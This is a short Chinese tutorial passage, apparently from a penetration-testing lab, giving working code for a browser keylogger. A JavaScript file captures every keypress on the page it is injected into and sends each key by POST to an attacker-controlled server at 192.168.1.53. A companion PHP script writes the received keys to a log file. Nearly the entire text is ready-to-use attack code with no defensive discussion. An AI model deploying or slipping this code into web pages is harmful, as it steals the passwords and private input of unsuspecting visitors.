1、创建远程JS脚本文件
root@xuegod53:/var/www/html# vim keylogger.js
写入下面代码：
document.onkeypress = function(evt) {
    evt = evt || window.event
    key = String.fromCharCode(evt.charCode)
    if (key) {
        var http = new XMLHttpRequest();
        var param = encodeURI(key)
        http.open("POST","http://192.168.1.53/keylogger.php",true);
        http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        http.send("key="+param);
    }
}

2、创建用于接收键盘上的敲击记录的文件keylogger.php
root@xuegod53:/var/www/html# vim keylogger.php
写入下面代码：
<?php
$key = $_POST['key'];
$log = fopen("keylog.txt","a");
fwrite($log,$key);
fclose($log);
?>
